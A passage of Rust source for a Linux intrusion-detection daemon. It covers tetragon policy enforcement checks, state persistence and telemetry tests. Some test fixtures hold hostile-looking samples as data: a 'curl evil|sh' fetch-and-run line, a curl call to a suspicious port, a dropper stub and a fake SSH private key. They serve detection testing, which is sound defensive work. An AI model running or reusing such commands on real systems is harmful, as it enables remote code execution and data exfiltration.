            "digest": self.digest_enabled,
            "digest_enabled": self.digest_enabled,
            "digest_summary": digest_summary,
            "incidents": incident::count(&self.incidents_dir()),
            "incidents_dir": self.incidents_dir().display().to_string(),
            "incidents_captured": self.incidents_captured,
            // Design 2b/3a. `chains_open` is what the panel needs to know it
            // must render 3a instead of 1b; `chains_formed` is the counter for
            // the digest and for judging whether the thresholds are right.
            "chains_open": self.chains.len(),
            "chains_formed": self.chains.formed,
            "receipts": self.store.receipts().len(),
            "installs_watched": self.receipts.len(),

            "provenance": {
                "packages": self.provenance.db().packages,
                "files": self.provenance.db().files,
                "trusted_repos": self.cfg.baseline.trusted_repos,
            },
        });
        // Inserted rather than written inline: `json!` hits its recursion limit
        // on an object this size.
        //
        // Which rules CAN be armed, and what arming one actually does.
        // `enforcing_rules` above says what IS armed, which is not enough to
        // offer the choice anywhere: only a rule whose policy carries an
        // enforcing action can be armed at all -- 7 of 46 here -- and the two
        // kinds are different promises. `kill` ends the process; `deny` refuses
        // the operation with -EPERM and the program keeps running. Anything
        // presenting this as a switch has to be able to say which one the user
        // is turning on.
        if let Some(o) = out.as_object_mut() {
            // The three plainly named populations of alerts.jsonl, so nothing
            // downstream has to print a count under a word that means something
            // else. `unacked` above is unchanged and stays the badge -- the
            // panel builds against it -- and `ledger.needs_you` is that same
            // set as one number. See `AlertStore::ledger`.
            o.insert(
                "ledger".into(),
                json!({
                    "needs_you": ledger.needs_you,
                    "recorded": ledger.recorded,
                    "suppressed": ledger.suppressed,
                    "signal": ledger.signal,
                }),
            );
            // What the RECORD says (`enforcing_rules`, above) split by what the
            // KERNEL says. The panel keeps binding to `enforcing_rules`; these
            // two are the honest breakdown of it, and they are the difference
            // between "seven rules are armed" and "seven rules are listed as
            // armed and none of them will kill anything" -- which is what this
            // machine was in for most of 2026-09-05.
            //
            // An empty `enforcing_unverified` alongside an empty
            // `enforcing_verified` and a non-empty `enforcing_rules` means
            // moatd could not ask the kernel, not that the kernel agreed.
            // `enforcement_unhealthy` is the single boolean, exactly like
            // `sensor_unhealthy`.
            o.insert(
                "enforcing_verified".into(),
                Value::from(self.enforcing_verified.iter().cloned().collect::<Vec<_>>()),
            );
            o.insert(
                "enforcing_unverified".into(),
                Value::from(self.enforcing_unverified.iter().cloned().collect::<Vec<_>>()),
            );
            o.insert(
                "enforcement_unhealthy".into(),
                Value::from(!self.enforcing_unverified.is_empty()),
            );
            o.insert(
                "arming_pending".into(),
                Value::from(matches!(self.arming, Arming::Waiting { .. })),
            );
            o.insert("enforceable".into(), Value::from(self.enforceable()));
            // Also what `write_state` persists, which is how a containment
            // survives a restart. A policy moatd forgot is one nobody will ever
            // delete: it would keep refusing that connection until tetragon
            // next restarts, with nothing on screen saying why.
            o.insert("contain".into(), self.contain.to_state());
            o.insert(
                "kernel_exclusions".into(),
                serde_json::to_value(&self.kernel_exclusions).unwrap_or(Value::Null),
            );
            o.insert("contain_enabled".into(), Value::from(self.cfg.contain.enabled));
            o.insert("contain_kill".into(), Value::from(self.cfg.contain.kill.clone()));
            // Rules that are on but cannot fire. Empty on a healthy machine.
            o.insert(
                "inert_rules".into(),
                serde_json::to_value(self.inert_rules()).unwrap_or(Value::Null),
            );
            // The hourly content-analysis budget. Persisted for the same reason
            // the containment is: an allowance a restart refills is not one.
            o.insert("content".into(), self.content.to_state());
            // Written into state.json on every save, so the NEXT start can see
            // how long moat was not running. Stopping the daemon needs root,
            // and a root-level shutdown left no trace at all before this.
            o.insert("heartbeat".into(), Value::from(util::unix_secs()));
        }
        out
    }

    pub fn write_state(&self) {
        let path = self.cfg.paths.state_file();
        let body = format!(
            "{}\n",
            serde_json::to_string_pretty(&self.status()).unwrap_or_default()
        );
        if let Err(e) = util::atomic_write(&path, body.as_bytes(), 0o640) {
            log::warn!("state.json: {}", e);
            return;
        }
        let _ = util::secure_path(&path, &self.cfg.group, 0o640);
    }
}

/// `Finding` built straight from a policy name needs its family from the name.
impl Finding {
    fn family_fixup(&mut self) {
        if self.meta.family.is_empty() || self.meta.family == "other" {
            self.meta.family = family_of(&self.rule);
        }
    }
}

fn access_word(mask: Option<i64>) -> Option<String> {
    let m = mask?;
    let mut parts = Vec::new();
    if m & 4 != 0 {
        parts.push("read");
    }
    if m & 2 != 0 {
        parts.push("write");
    }
    if m & 1 != 0 {
        parts.push("exec");
    }
    if m & 8 != 0 {
        parts.push("append");
    }
    if parts.is_empty() {
        Some(format!("mask {}", m))
    } else {
        Some(parts.join("+"))
    }
}

/// Open `telemetry.jsonl` only when there is something to write to it.
///
/// `alerts` is not a reason: that class *is* `alerts.jsonl`, which already
/// exists and is already the right file. With every other class off this
/// returns `None` and the whole telemetry path costs one `Option` check per
/// event, which is what "off by default" has to mean at 42 events a second.
fn open_telemetry(cfg: &Config) -> Option<crate::telemetry::TelemetryStore> {
    if !(cfg.telemetry.process || cfg.telemetry.network || cfg.telemetry.file) {
        return None;
    }
    for p in cfg.telemetry.problems() {
        log::warn!("telemetry: {}", p);
    }
    match crate::telemetry::TelemetryStore::open(
        &cfg.paths.telemetry(),
        &cfg.paths.telemetry_rotated(),
        cfg.telemetry.max_bytes,
        &cfg.group,
    ) {
        Ok(s) => {
            log::info!(
                "telemetry classes on: {:?} -> {}",
                cfg.telemetry.classes(),
                s.path().display()
            );
            Some(s)
        }
        Err(e) => {
            log::error!("telemetry: {} ({})", e, cfg.paths.telemetry().display());
            None
        }
    }
}

/// The sha256 an incident snapshot already computed for this file, if it copied
/// it. Saves the content analyser a second walk over the same bytes.
///
/// The incident record on the alert carries `file/<basename>` and a size, not
/// the original path (the path -> copy mapping lives in the snapshot's
/// `meta.json`, which is not folded into the alert). Basename alone would be
/// enough to attach the wrong hash to the wrong file — two `index.js` in one
/// tree is not exotic — so the size has to agree as well. If it does not, this
/// returns `None` and the analyser hashes what it reads, which is always
/// correct and merely costs a hash over a buffer already in memory.
fn incident_sha(a: &Alert, path: &str) -> Option<String> {
    let inc = a.incident.as_ref()?;
    let want = format!("file/{}", util::basename(path));
    let size = std::fs::metadata(path).ok()?.len();
    let mut hit = inc
        .files
        .iter()
        .filter(|f| f.name == want && f.size == size && f.sha256.len() == 64);
    let first = hit.next()?;
    if hit.next().is_some() {
        return None;
    }
    Some(first.sha256.clone())
}

fn read_state(path: &Path) -> Option<Value> {
    let text = std::fs::read_to_string(path).ok()?;
    serde_json::from_str(&text).ok()
}

// ---------------------------------------------------------------- arming

/// Where the post-start re-arming has got to. See `Daemon::arm_tick`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Arming {
    /// Nothing left to do: everything took, or nothing is armed, or the
    /// deadline passed and the outcome is published in `enforcing_unverified`.
    Idle,
    /// Waiting for the sensor to finish loading, or retrying a `set-mode` that
    /// failed. All three fields are unix seconds / attempt counts.
    Waiting { deadline: u64, next_try: u64, tries: u32 },
}

/// Seconds until the next arming attempt. Bounded and monotone: quick while the
/// sensor is plausibly still loading (16 s on this machine), slower once it is
/// clear something is actually wrong, so a dead sensor does not mean a `tetra`
/// fork every five seconds for two minutes.
fn arm_backoff(tries: u32) -> u64 {
    match tries {
        0..=3 => 2,
        4..=7 => 5,
        8..=15 => 15,
        _ => 30,
    }
}

/// The wanted policies the kernel does NOT report as enforcing.
///
/// A name the kernel has never heard of counts as disagreeing, not as
/// "unknown": a policy that is not loaded is certainly not enforcing.
fn disagreeing(
    want: &[String],
    modes: &std::collections::BTreeMap<String, String>,
) -> Vec<String> {
    want.iter()
        .filter(|n| modes.get(*n).map(|m| m != "enforce").unwrap_or(true))
        .cloned()
        .collect()
}

/// `TP_MODE_ENFORCE` / `1` / `"enforce"` -> `"enforce"`, and the monitor forms
/// likewise. Anything else stays as it came, lowercased, so an unrecognised
/// mode is reported rather than silently counted as one of the two we know.
fn normalise_mode(v: &Value) -> String {
    if let Some(n) = v.as_u64() {
        // TracingPolicyMode from the descriptor in /usr/bin/tetra (v1.7.1):
        // UNKNOWN 0, ENFORCE 1, MONITOR 2, MONITOR_ONLY 3.
        return match n {
            1 => "enforce".into(),
            2 | 3 => "monitor".into(),
            _ => "unknown".into(),
        };
    }
    let s = v.as_str().unwrap_or("").to_ascii_uppercase();
    if s.contains("ENFORCE") {
        "enforce".into()
    } else if s.contains("MONITOR") {
        "monitor".into()
    } else {
        s.to_ascii_lowercase()
    }
}

/// `tetra tracingpolicy list -o json` -> `{policy name: mode}`.
///
/// Deliberately shape-tolerant. The response is
/// `{"policies":[{"name":…,"mode":…}]}` in v1.7.1, but the enum can serialise
/// as a name or a number depending on which marshaller is in the path, and
/// tetra has moved this output around between releases. So this walks the JSON
/// for any object carrying both a name and a mode rather than pinning one
/// path — a parser that breaks on an upgrade would take enforcement
/// verification down with it, silently, which is the failure it exists to
/// catch. Falls back to the `ID NAME STATE … MODE` text table.
fn parse_policy_modes(text: &str) -> Option<std::collections::BTreeMap<String, String>> {
    let mut out = std::collections::BTreeMap::new();
    if let Ok(v) = serde_json::from_str::<Value>(text) {
        collect_policy_modes(&v, &mut out);
        if !out.is_empty() {
            return Some(out);
        }
        // Valid JSON that named no policy: the sensor is up and running none.
        // That is an answer, not a parse failure.
        return Some(out);
    }
    // Text table: `ID NAME STATE FILTERID NAMESPACE SENSORS KERNELMEMORY MODE
    // NPOST NENFORCE NMONITOR`, space-padded by Go's tabwriter.
    //
    // Read by SHAPE, not by column index. tabwriter pads with spaces, so an
    // empty column (NAMESPACE, always empty here) is invisible once the line is
    // split and every index after it is wrong. The id is a number, the name
    // follows it, and the mode is the only `TP_MODE_*` token on the line.
    let mut saw_header = false;
    for line in text.lines() {
        let f: Vec<&str> = line.split_whitespace().collect();
        if f.contains(&"NAME") && f.contains(&"MODE") {
            saw_header = true;
            continue;
        }
        if !saw_header || f.len() < 3 || f[0].parse::<u64>().is_err() {
            continue;
        }
        if let Some(mode) = f.iter().find(|t| t.starts_with("TP_MODE_")) {
            out.insert(f[1].to_string(), normalise_mode(&Value::from(*mode)));
        }
    }
    saw_header.then_some(out)
}

fn collect_policy_modes(v: &Value, out: &mut std::collections::BTreeMap<String, String>) {
    match v {
        Value::Array(a) => a.iter().for_each(|e| collect_policy_modes(e, out)),
        Value::Object(o) => {
            let name = o.get("name").or_else(|| o.get("Name")).and_then(|n| n.as_str());
            let mode = o.get("mode").or_else(|| o.get("Mode"));
            if let (Some(name), Some(mode)) = (name, mode) {
                out.insert(name.to_string(), normalise_mode(mode));
            }
            o.values().for_each(|e| collect_policy_modes(e, out));
        }
        _ => {}
    }
}

/// Per-rule enforcement survives a restart the same way `mode` does: through
/// state.json, which is `status()` written back out.
fn persisted_enforcing_rules(state: &Option<Value>) -> std::collections::BTreeSet<String> {
    state
        .as_ref()
        .and_then(|s| s.get("enforcing_rules"))
        .and_then(|v| v.as_array())
        .map(|a| {
            a.iter()
                .filter_map(|v| v.as_str().map(str::to_string))
                .collect()
        })
        .unwrap_or_default()
}

/// `[contain] enabled` as the USER last set it.
///
/// Same shape as `persisted_mode`, and for the same reason: a switch a person
/// flips is runtime state, not configuration. Making containment a root-owned
/// TOML edit plus a `systemctl restart` -- which is how it shipped first --
/// put a security feature behind a text editor and a service restart, while
/// every other switch on this daemon (mode, sandbox, digest) needed neither.
/// The file stays the DEFAULT for a fresh machine; this is the override.
/// The kernel exclusions recorded in state.json, for `render-policies`.
///
/// A free function because rendering happens in a separate process before the
/// daemon exists (ExecStartPre), and the exclusions have to be applied there or
/// the program the user allowed starts dying again on the next boot.
pub fn read_exclusions(
    state_file: &Path,
) -> std::collections::BTreeMap<String, Vec<String>> {
    let mut out = std::collections::BTreeMap::new();
    let Some(state) = read_state(state_file) else {
        return out;
    };
    let Some(map) = state.get("kernel_exclusions").and_then(|v| v.as_object()) else {
        return out;
    };
    for (policy, bins) in map {
        let list: Vec<String> = bins
            .as_array()
            .map(|a| a.iter().filter_map(|b| b.as_str().map(str::to_string)).collect())
            .unwrap_or_default();
        if !list.is_empty() {
            out.insert(policy.clone(), list);
        }
    }
    out
}

/// The rules whose finding is "a setuid or setgid bit was set".
fn is_setuid_rule(name: &str) -> bool {
    name == "moat-priv-setuid-chmod" || name == "moat-priv-setcap-xattr"
}

/// Why this setuid/setcap event grants no privilege, if it does not.
///
/// `None` means it really is a privilege signal: the actor is root, the file
/// belongs to somebody else, or moat could not tell. Could-not-tell must never
/// read as harmless, so a failed `stat` returns `None`.
fn setuid_grants_nothing(f: &crate::explain::Finding, path: &str) -> Option<String> {
    use std::os::unix::fs::MetadataExt;
    let actor = f.proc.uid;
    if actor == 0 {
        return None;
    }
    let owner = std::fs::metadata(path).ok()?.uid();
    (owner == actor).then(|| {
        format!(
            "uid {} set this bit on a file uid {} already owns, so it grants no privilege: \
             setuid means \"run as the file's owner\", and the owner is the caller",
            actor, owner
        )
    })
}

fn persisted_contain(state: &Option<Value>) -> Option<bool> {
    state.as_ref()?.get("contain_enabled")?.as_bool()
}

/// The panel can change `kill`, so like `contain_enabled` it has to survive a
/// restart from state.json rather than from moat.toml -- moatd does not
/// rewrite a config file the user also owns. An unrecognised value is ignored
/// rather than defaulted, so a corrupt state file cannot silently arm SIGKILL.
fn persisted_kill(state: &Option<Value>) -> Option<String> {
    let v = state.as_ref()?.get("contain_kill")?.as_str()?;
    matches!(v, "off" | "log" | "kill").then(|| v.to_string())
}

fn persisted_mode(state: &Option<Value>) -> Option<String> {
    let m = state.as_ref()?.get("mode")?.as_str()?;
    (m == "monitor" || m == "enforce").then(|| m.to_string())
}

/// BASELINE §3 puts `installed_at` in `state.json`; it is stamped there on the
/// first run and never moved again, so a wiped `baseline.json` does not restart
/// the learning window on a machine that has been running for months.
fn persisted_installed_at(state: &Option<Value>) -> Option<u64> {
    let v = state.as_ref()?.get("installed_at")?;
    if let Some(n) = v.as_u64() {
        return (n > 0).then_some(n);
    }
    let nanos = util::rfc3339_to_nanos(v.as_str()?)?;
    let secs = (nanos / 1_000_000_000) as u64;
    (secs > 0).then_some(secs)
}

/// LEARNING §5: the digest switch lives in state.json, so turning it off needs
/// no root and no `systemctl`. `digest_enabled` is the name the doc gives it;
/// `digest` is the boolean `status` publishes. Either is accepted.
fn persisted_digest_enabled(state: &Option<Value>) -> Option<bool> {
    let s = state.as_ref()?;
    s.get("digest_enabled")
        .or_else(|| s.get("digest"))
        .and_then(|v| v.as_bool())
}

fn persisted_u64(state: &Option<Value>, section: &str, key: &str) -> u64 {
    state
        .as_ref()
        .and_then(|s| s.get(section))
        .and_then(|s| s.get(key))
        .and_then(|v| v.as_u64())
        .unwrap_or(0)
}

/// A synthetic process for the alerts moat raises about itself. The pid is our
/// own so `ps -fp` shows something real, and there is nothing to kill.
fn self_proc(about: &str) -> ProcInfo {
    let (sid, tty) = crate::proctable::read_session(std::process::id());
    ProcInfo {
        exec_id: String::new(),
        pid: std::process::id(),
        uid: unsafe { libc::geteuid() },
        exe: std::env::current_exe()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|_| "/usr/bin/moatd".into()),
        args: about.to_string(),
        cwd: String::new(),
        start_time: util::now_rfc3339(),
        parent_exec_id: None,
        exited_at: None,
        exit_signal: None,
        exe_note: None,
        sid,
        tty,
    }
}

/// Append one learned block to `baseline.toml`, creating it with a header that
/// says who writes it and how to undo it.
fn write_learned(path: &Path, comment: &str, toml: &str) -> std::io::Result<()> {
    use std::io::Write;
    if let Some(p) = path.parent() {
        std::fs::create_dir_all(p)?;
    }
    let mut block = String::new();
    if !path.exists() {
        block.push_str(
            "# Written by moatd's learning window (BASELINE §3). Every entry says how it was\n\
             # earned. Remove one with `moatctl allowlist` then `moatctl unignore --file\n\
             # baseline.toml <index>`, or restart learning with `moatctl baseline relearn`.\n",
        );
    }
    block.push('\n');
    block.push_str(&format!("# {}\n", comment));
    block.push_str(toml);
    let mut f = std::fs::OpenOptions::new().create(true).append(true).open(path)?;
    f.write_all(block.as_bytes())?;
    f.sync_all()
}

// ------------------------------------------------------------------- run loop

pub struct RunOptions {
    /// Replay the log from offset 0 instead of tailing from the end.
    pub from_start: bool,
    /// Stop once the log has no more lines (used by dev-run and tests).
    pub once: bool,
    pub poll: Duration,
}

impl Default for RunOptions {
    fn default() -> Self {
        Self {
            from_start: false,
            once: false,
            poll: Duration::from_millis(200),
        }
    }
}

pub fn run(daemon: Arc<Mutex<Daemon>>, opts: RunOptions) {
    {
        // The kernel has to agree with what the record says is armed -- but
        // NOT yet. `begin_arming` only starts the clock; `tick` does the
        // arming, once the sensor says it has the policies. Arming here, 2 s
        // after start, is the 2026-09-05 outage: tetragon is `Type=simple`, so
        // systemd calls it started while it is still 16 seconds from loading
        // the last of 44 policies, and all seven `set-mode` calls failed
        // against a sensor that did not have those names yet.
        let mut d = daemon.lock().expect("daemon lock");
        let now = util::unix_secs();
        d.begin_arming(now);
        d.report_downtime();
    }
    let (log_path, state_every, feeds_every, feeds_dir) = {
        let d = daemon.lock().expect("daemon lock");
        (
            d.cfg.paths.tetragon_log.clone(),
            d.cfg.thresholds.state_interval_secs,
            d.cfg.thresholds.feeds_poll_secs,
            d.cfg.paths.feeds(),
        )
    };
    let mut tailer = Tailer::new(&log_path, opts.from_start);
    let mut last_state = 0u64;
    let mut last_feeds = util::unix_secs();
    let mut idle_polls = 0u32;

    log::info!("tailing {}", log_path.display());
    loop {
        if SHUTDOWN.load(Ordering::SeqCst) {
            log::info!("shutting down");
            let mut d = daemon.lock().expect("daemon lock");
            // rarity.json and baseline.json are flushed on the way out; the
            // 60 s timer must not cost a day of counters on a restart.
            d.tick(util::unix_secs(), true);
            d.flush_telemetry();
            d.write_state();
            break;
        }
        if RELOAD.swap(false, Ordering::SeqCst) {
            log::info!("SIGHUP: reloading policies and allowlist");
            daemon.lock().expect("daemon lock").reload();
        }

        let lines = tailer.poll();
        let got = !lines.is_empty();
        if got {
            let mut d = daemon.lock().expect("daemon lock");
            for l in lines {
                d.handle_line(&l);
            }
        }

        let now = util::unix_secs();
        if now.saturating_sub(last_state) >= state_every {
            last_state = now;
            let mut d = daemon.lock().expect("daemon lock");
            d.table.prune(now);
            // One stat of /var/lib/pacman/local; a reload only happens when a
            // transaction actually moved it (BASELINE §1).
            d.on_pacman_change();
            d.tick(now, false);
            // Telemetry is written per event and flushed here, not per line:
            // 42 exec events a second is 42 write(2)s, and putting a flush on
            // each one would push the sensor's own I/O onto the event path.
            d.flush_telemetry();
            d.write_state();
        }
        if now.saturating_sub(last_feeds) >= feeds_every {
            last_feeds = now;
            let mut d = daemon.lock().expect("daemon lock");
            if d.feeds.reload_if_changed(&feeds_dir) {
                log::info!("feeds reloaded: {} hashes", d.feeds.meta.hashes);
            }
        }

        if got {
            idle_polls = 0;
        } else {
            idle_polls += 1;
            if opts.once && idle_polls > 2 {
                let mut d = daemon.lock().expect("daemon lock");
                let now = util::unix_secs();
                d.table.prune(now);
                d.tick(now, true);
                d.flush_telemetry();
                d.write_state();
                break;
            }
            std::thread::sleep(opts.poll);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn dev_daemon(dir: &Path) -> (Daemon, Config) {
        let mut cfg = Config::default();
        cfg.paths.state_dir = dir.join("state");
        cfg.paths.runtime_dir = dir.join("run");
        cfg.paths.socket = dir.join("run/control.sock");
        cfg.paths.policies_dir =
            Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/policies");
        cfg.paths.allowlist_dir = dir.join("allowlist.d");
        cfg.paths.tetragon_log = Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/sample.log");
        cfg.paths.sandbox_flag = dir.join("sandbox.enabled");
        // Snapshots and bundles must never touch the real /var/lib/moat.
        cfg.analysis.bundle_dir = dir.join("incidents");
        // Provenance runs off a fixture, so no test touches the real pacman
        // database and none of them spawn the real pacman.
        cfg.paths.pacman_local = Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/pacman-local");
        cfg.paths.pacman = Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/fake-pacman");
        std::fs::create_dir_all(&cfg.paths.allowlist_dir).unwrap();
        let mut d = Daemon::new(cfg.clone(), &dir.join("moat.toml")).unwrap();
        d.homes = vec!["/home/dan".into()];
        d.provenance.set_homes(&d.homes);
        (d, cfg)
    }

    // ------------------------------------------------------------- telemetry

    fn telemetry_daemon(dir: &Path, f: impl FnOnce(&mut crate::config::TelemetryConfig)) -> Daemon {
        let mut cfg = Config::default();
        cfg.paths.state_dir = dir.join("state");
        cfg.paths.policies_dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/policies");
        cfg.paths.allowlist_dir = dir.join("allowlist.d");
        cfg.paths.sandbox_flag = dir.join("sandbox.enabled");
        cfg.analysis.bundle_dir = dir.join("incidents");
        cfg.paths.pacman_local = Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/pacman-local");
        cfg.paths.pacman = Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/fake-pacman");
        std::fs::create_dir_all(&cfg.paths.allowlist_dir).unwrap();
        f(&mut cfg.telemetry);
        let mut d = Daemon::new(cfg, &dir.join("moat.toml")).unwrap();
        d.homes = vec!["/home/dan".into()];
        d
    }

    /// Timing probe, not a test: `MOAT_BENCH_DIR=<dir with alerts.jsonl and
    /// alerts.1.jsonl> cargo test --release --lib engine::tests::bench_status -- --ignored --nocapture`.
    #[test]
    #[ignore]
    fn bench_status() {
        let Ok(src) = std::env::var("MOAT_BENCH_DIR") else { return };
        let src = Path::new(&src);
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join("state")).unwrap();
        for f in ["alerts.jsonl", "alerts.1.jsonl"] {
            std::fs::copy(src.join(f), dir.path().join("state").join(f)).unwrap();
        }
        let d = telemetry_daemon(dir.path(), |_| {});
        let now = util::unix_secs();
        for _ in 0..3 {
            let t = std::time::Instant::now();
            let _ = d.store.unacked();
            let t_un = t.elapsed();
            let t = std::time::Instant::now();
            let _ = d.digest(now);
            let t_dg = t.elapsed();
            let t = std::time::Instant::now();
            let _ = d.store.receipts().len();
            let t_rc = t.elapsed();
            let t = std::time::Instant::now();
            let _ = d.tetragon_state();
            let t_ts = t.elapsed();
            let t = std::time::Instant::now();
            let _ = incident::count(&d.incidents_dir());
            let t_ic = t.elapsed();
            let t = std::time::Instant::now();
            let st = d.status();
            let t_st = t.elapsed();
            let t = std::time::Instant::now();
            let body = serde_json::to_string_pretty(&st).unwrap();
            let t_ser = t.elapsed();
            let t = std::time::Instant::now();
            d.write_state();
            let t_ws = t.elapsed();
            eprintln!("BENCH unacked {:?} digest {:?} receipts {:?} tetragon_state {:?} incident::count {:?} | status() {:?} ({} bytes) serialize {:?} write_state {:?}",
                t_un, t_dg, t_rc, t_ts, t_ic, t_st, body.len(), t_ser, t_ws);
        }
    }

    fn telemetry_lines(d: &Daemon) -> Vec<Value> {
        std::fs::read_to_string(d.cfg.paths.telemetry())
            .unwrap_or_default()
            .lines()
            .filter(|l| !l.trim().is_empty())
            .map(|l| serde_json::from_str(l).unwrap())
            .collect()
    }

    /// Off by default means off: no file, no writes, and one Option check per
    /// event on a path that runs 42 times a second.
    #[test]
    fn every_class_but_alerts_is_off_and_writes_nothing() {
        let dir = tempfile::tempdir().unwrap();
        let mut d = telemetry_daemon(dir.path(), |_| {});
        assert!(d.telemetry.is_none());
        assert_eq!(d.cfg.telemetry.classes(), vec!["alerts"]);
        let text = std::fs::read_to_string(
            Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/sample.log"),
        )
        .unwrap();
        for l in text.lines() {
            d.handle_line(l);
        }
        assert_eq!(d.telemetry_written, 0);
        assert!(!d.cfg.paths.telemetry().exists());
        assert!(!d.store.load().is_empty(), "alerts still happen");
    }

    /// THE CONSTRAINT. A telemetry event must not be evaluated against a single
    /// rule: with the file class posting ~19 events/s through the kernel filter
    /// during an install, running each through ancestry-walking rules is how a
    /// detection daemon melts. It is recorded and it raises nothing.
    #[test]
    fn a_telemetry_event_is_recorded_and_never_evaluated() {
        let dir = tempfile::tempdir().unwrap();
        let mut d = telemetry_daemon(dir.path(), |t| {
            t.network = true;
            t.file = true;
        });
        assert!(d.telemetry.is_some());

        // A connect to a port that moat-net-suspicious-port-egress would alert
        // on, carried by a telemetry policy instead. It must be recorded and
        // must not become an alert.
        d.handle_line(
            r#"{"process_exec":{"process":{"exec_id":"t1","pid":9001,"uid":1000,
                 "binary":"/usr/bin/curl","arguments":"http://1.2.3.4:4444/x",
                 "start_time":"2026-09-04T10:00:00.000000000Z"}}}"#,
        );
        d.handle_line(
            r#"{"process_kprobe":{"process":{"exec_id":"t1","pid":9001,"binary":"/usr/bin/curl"},
                 "function_name":"tcp_connect","policy_name":"moat-telemetry-network-connect",
                 "args":[{"sock_arg":{"family":"AF_INET","daddr":"1.2.3.4","dport":4444}}],
                 "action":"KPROBE_ACTION_POST"},"time":"2026-09-04T10:00:01.000000000Z"}"#,
        );
        d.flush_telemetry();

        assert!(d.store.load().is_empty(), "telemetry raised an alert");
        assert_eq!(d.alerts_emitted, 0);
        let recs = telemetry_lines(&d);
        assert_eq!(recs.len(), 1, "{:?}", recs);
        assert_eq!(recs[0]["class"], "network");
        assert_eq!(recs[0]["dst_ip"], "1.2.3.4");
        assert_eq!(recs[0]["dst_port"], 4444);
        // Ancestry is why the process table is still updated before the fork.
        assert_eq!(recs[0]["exe"], "/usr/bin/curl");
        assert_eq!(recs[0]["pid"], 9001);
    }

    /// The ladder, through the real event path: a create in a build tree is
    /// dropped, and a rewrite of a file that already existed is not — that
    /// second case is the npm-package-rewrites-its-own-index.js one.
    #[test]
    fn the_file_ladder_drops_the_install_and_keeps_the_rewrite() {
        let dir = tempfile::tempdir().unwrap();
        let tree = dir.path().join("app/node_modules/express");
        std::fs::create_dir_all(&tree).unwrap();
        let fresh = tree.join("index.js");
        std::fs::write(&fresh, b"module.exports = 1\n").unwrap();

        let mut d = telemetry_daemon(dir.path(), |t| {
            t.file = true;
            // The file is seconds old, so a window of 0 makes it read as
            // pre-existing and a large window makes it read as just-created.
            t.create_window_secs = 0;
            t.quiet_creates_under = vec!["/node_modules/".into()];
        });

        let hook = |path: &str| {
            format!(
                r#"{{"process_kprobe":{{"process":{{"exec_id":"w1","pid":9100,"binary":"/usr/bin/node"}},
                     "function_name":"security_file_post_open",
                     "policy_name":"moat-telemetry-file-exec-shape",
                     "args":[{{"file_arg":{{"path":"{}"}}}},{{"int_arg":2}}]}},
                     "time":"2026-09-04T10:00:01.000000000Z"}}"#,
                path
            )
        };
        d.handle_line(&hook(&fresh.display().to_string()));
        d.flush_telemetry();
        let recs = telemetry_lines(&d);
        assert_eq!(recs.len(), 1, "a modify under node_modules is the signal");
        assert_eq!(recs[0]["verdict"], "modify");
        assert_eq!(recs[0]["shape"], "script");
        assert_eq!(recs[0]["kind"], "file_write");
        assert!(recs[0]["sha256"].is_string());
        assert!(recs[0].get("body").is_none(), "no body unless asked for");
        assert_eq!(d.telemetry_filtered, 0);

        // The same path, same policy, but now it counts as a create: dropped.
        d.cfg.telemetry.create_window_secs = 86_400;
        d.handle_line(&hook(&fresh.display().to_string()));
        d.flush_telemetry();
        assert_eq!(telemetry_lines(&d).len(), 1, "the create is not recorded");
        assert_eq!(d.telemetry_filtered, 1);

        // …and a create outside a build tree still is.
        let bin = dir.path().join("bin");
        std::fs::create_dir_all(&bin).unwrap();
        let drop = bin.join("payload.sh");
        std::fs::write(&drop, b"#!/bin/sh\ncurl evil|sh\n").unwrap();
        d.handle_line(&hook(&drop.display().to_string()));
        d.flush_telemetry();
        let recs = telemetry_lines(&d);
        assert_eq!(recs.len(), 2);
        assert_eq!(recs[1]["verdict"], "create");
    }

    #[test]
    fn a_chmod_x_is_its_own_verdict_and_needs_no_birth_time() {
        let dir = tempfile::tempdir().unwrap();
        let f = dir.path().join("dropper");
        std::fs::write(&f, b"\x7fELF\x02rest").unwrap();
        let mut d = telemetry_daemon(dir.path(), |t| t.file = true);
        d.handle_line(&format!(
            r#"{{"process_lsm":{{"process":{{"exec_id":"c1","pid":9200,"binary":"/usr/bin/chmod"}},
                 "function_name":"path_chmod",
                 "policy_name":"moat-telemetry-file-became-executable",
                 "args":[{{"path_arg":{{"path":"{}"}}}},{{"int_arg":493}}]}}}}"#,
            f.display()
        ));
        d.flush_telemetry();
        let recs = telemetry_lines(&d);
        assert_eq!(recs.len(), 1);
        assert_eq!(recs[0]["verdict"], "chmod_x");
        assert_eq!(recs[0]["kind"], "file_chmod");
        // Magic bytes, not the (absent) extension.
        assert_eq!(recs[0]["shape"], "elf");
    }

    /// Body capture is opt-in, capped, and inherits the credential refusal that
    /// stops `evidence.rs` staging a key for an AI. A path that looks like key
    /// material is never read, whatever the config says.
    #[test]
    fn body_capture_is_opt_in_and_never_reads_a_credential() {
        let dir = tempfile::tempdir().unwrap();
        let ssh = dir.path().join(".ssh");
        std::fs::create_dir_all(&ssh).unwrap();
        let key = ssh.join("id_ed25519");
        std::fs::write(&key, b"-----BEGIN OPENSSH PRIVATE KEY-----\n").unwrap();
        let script = dir.path().join("setup.sh");
        std::fs::write(&script, b"#!/bin/sh\necho hi\n").unwrap();
        let big = dir.path().join("big.sh");
        std::fs::write(&big, vec![b'x'; 4096]).unwrap();

        let mut d = telemetry_daemon(dir.path(), |t| {
            t.file = true;
            t.capture_body = true;
            t.capture_body_max_bytes = 1024;
            t.create_window_secs = 0;
        });
        let hook = |p: &Path| {
            format!(
                r#"{{"process_kprobe":{{"process":{{"exec_id":"b1","pid":1,"binary":"/usr/bin/sh"}},
                     "function_name":"security_file_post_open",
                     "policy_name":"moat-telemetry-file-exec-shape",
                     "args":[{{"file_arg":{{"path":"{}"}}}},{{"int_arg":2}}]}}}}"#,
                p.display()
            )
        };
        for p in [&script, &key, &big] {
            d.handle_line(&hook(p));
        }
        d.flush_telemetry();
